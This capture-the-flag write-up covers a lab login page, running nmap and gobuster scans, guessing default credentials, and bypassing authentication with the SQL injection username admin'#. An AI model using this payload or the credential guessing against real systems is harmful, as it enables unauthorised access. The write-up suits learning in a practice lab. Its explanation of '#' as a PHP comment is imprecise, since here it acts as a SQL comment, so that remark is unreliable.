1. **Scan all the ports using default scripts and determine service and version of open ports**
```bash
nmap -sV -sC [target ip]
```
--> port 80/tcp - open - http
--> http-server-header: Apache/2.4.38 (Debian) / http-title: Login


2. **Search the IP of the machine on our browser**
--> We can see a basic Login Page, but we don't have the user and the password yet.


3. **Check out the web directories with Gobuster**
```shell
gobuster dir -u http://[target ip]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
--> We have not found helpful information


4. **Try with deafault credentials**
```shell
admin - admin
root - root
user - user
guest - guest
administrator - password
```
--> There wasn't the correct credentials


5. **Test the log in form for a possible SQL Injection vulnerability**
```php
# We can notice that in PHP language, "#" is used to make a comment, so we can conclude that if we use a "#" in the username, the website will read it like a comment, so it won't read the password.

--> Username: admin'#
	Password: [random]
```
--> **MACHINE PWNED!** Now, we are into the website and we can Capture the Flag.
